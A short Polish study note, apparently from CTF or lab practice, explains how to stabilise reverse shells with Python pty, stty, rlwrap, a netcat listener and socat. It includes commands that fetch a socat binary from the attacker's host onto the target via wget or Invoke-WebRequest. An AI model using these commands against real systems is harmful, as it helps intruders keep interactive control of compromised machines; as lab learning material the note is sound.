Domyślne shelle domyślnie są niestabline, nieinteraktywne, mają dziwne formatowanie itp. W tym celu można je ustablilizować. Na Windowsie jest to dużo bardziej skomplikowane.

## Python
To raczej w boxach albo ctf bo tam niemal zawsze jest python zainstalowany

1. `python -c 'import pty;pty.spawn("/bin/bash")'` użycie tego polecenia do stworzenia powłoki bash. Teraz będzie lepiej wyglądać ale dalej nie będzie działał tab do auto-uzupełniania i strzałki i ctrl+c wywali z tego
2. `export TERM=xterm` da dostęp do poleceń terminala jak `clear`
3. Wciskamy `ctrl+z` żeby dać powłokę w tło i w naszym własnym terminalu dajemy `stty raw -echo; fg`, to po pierwsze wyłączy nasz własny terminal echo co pozwoli na działanie strzałek i taba i ctrl+c zabije proces, dalej daje na fg powłokę.

Jak powłoka zginie to nie będzie widoczny mój własny input w terminalu i trzeba wpisać `reset`

## rlwrap

Program co robi że działają strzałki i tab i historia terminala ale jeżeli chce się ctrl+c w terminalu to trzeba jeszcze skonfigurować, nie jest zainstalowany domyślnie na kalim.

Użycie: `rlwrap nc -lvnp <port>` to od razu da lepszą powłokę nawet na Windowsie. Do ctrl+c dalej trzeba zrobić ctrl+z i dać do `stty raw -echo; fg`

## socat

Ta technika tylko na linuksie ma sens bo na Windows to będzie to samo co netcat, żeby to zadziałało trzeba wysłać do celu [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) raczej robi się to hostując `python3 -m http.server 80` i dalej pobierając na celu `wget <LOCAL-IP>/socat -O /tmp/socat`

Na windows to będzie coś takiego: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

## Rozmiar terminala

`stty -a` NA NASZYM TERMINALU W INNYM OKNIE to pokaże jakieś rzeczy i tam będzie info "rows x; columns y;" to wymiary naszego terminala, dalej w rev shell można zmienić:
- `stty rows <number>`
- `stty cols <number>`
